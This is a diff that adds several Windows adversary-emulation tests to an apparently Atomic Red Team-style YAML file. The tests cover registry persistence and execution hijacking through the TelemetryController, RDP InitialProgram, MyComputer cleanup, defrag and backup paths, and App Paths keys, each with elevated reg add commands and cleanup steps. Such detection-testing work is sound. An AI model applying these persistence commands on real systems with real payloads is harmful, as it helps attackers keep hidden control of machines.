@@ -1277,3 +1277,109 @@ atomic_tests:
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UsePIN /f
     name: command_prompt
     elevation_required: true
+
+- name: Abusing Windows TelemetryController Registry Key for Persistence
+  auto_generated_guid: 4469192c-2d2d-4a3a-9758-1f31d937a92b
+  description: |
+    The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run. 
+    It will run any arbitrary command without restriction of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence
+  supported_platforms:
+  - windows
+  input_arguments:
+    new_key:
+      description: New Registry Key Added
+      type: string
+      default: NewKey  
+    new_executable:
+      description: Custom Executable to run
+      type: string
+      default: C:\Windows\System32\notepad.exe  
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}" /t REG_SZ /v Command /d #{new_executable} /f
+    cleanup_command: |
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}" /f
+    name: command_prompt
+    elevation_required: true
+
+- name: Modify RDP-Tcp Initial Program Registry Entry
+  auto_generated_guid: c691cee2-8d17-4395-b22f-00644c7f1c2d
+  description: |
+    If the fInheritInitialProgram value is set to 1, the exe indicated in the InitialProgram value is automatically started on RDP connection.
+    Once the test commands are run, notepad will execute automatically on new RDP connection
+  supported_platforms:
+  - windows
+  executor:
+    command: | 
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v fInheritInitialProgram /t REG_DWORD /d 1 /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
+    cleanup_command: |
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "" /f
+    name: command_prompt
+    elevation_required: true
+
+- name: Abusing MyComputer Disk Cleanup Path for Persistence
+  auto_generated_guid: f2915249-4485-42e2-96b7-9bf34328d497
+  description: |
+    Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity
+  supported_platforms:
+  - windows  
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
+    cleanup_command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\cleanmgr.exe /D %c" /f
+    name: command_prompt
+    elevation_required: true
+- name: Abusing MyComputer Disk Fragmentation Path for Persistence
+  auto_generated_guid: 3235aafe-b49d-451b-a1f1-d979fa65ddaf
+  description: |
+    Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity
+  supported_platforms:
+  - windows  
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
+    cleanup_command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\dfrgui.exe" /f
+    name: command_prompt
+    elevation_required: true
+- name: Abusing MyComputer Disk Backup Path for Persistence
+  auto_generated_guid: 599f3b5c-0323-44ed-bb63-4551623bf675
+  description: |
+    Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity
+  supported_platforms:
+  - windows  
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
+    cleanup_command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%SystemRoot%\system32\sdclt.exe" /f
+    name: command_prompt
+    elevation_required: true
+
+- name: Adding custom paths for application execution
+  auto_generated_guid: 573d15da-c34e-4c59-a7d2-18f20d92dfa3
+  description: |
+    As per Microsoft,the entries found under App Paths are used primarily to map an application’s executable file name to that file’s fully qualified path and to pre-pend information to the PATH environment variable on a per-application, per-process basis. 
+    The path can be modified to load a custom application of choice. 
+    Post the registry changes of this test, when someone tries to manually run msedge.exe via StartMenu/Run window , notepad will be launched.
+  supported_platforms:
+  - windows 
+  input_arguments:
+    app_name:
+      description: path of application to be modified
+      type: string
+      default: msedge.exe 
+    new_path:
+      description: New App Path Added
+      type: string
+      default: C:\Windows\System32\notepad.exe 
+  executor:
+    command: |
+      reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}" /t REG_SZ /d #{new_path} /f
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}" /v (Default) /f
+      reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}" /t REG_SZ /d "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" /f
+    name: command_prompt
+    elevation_required: true
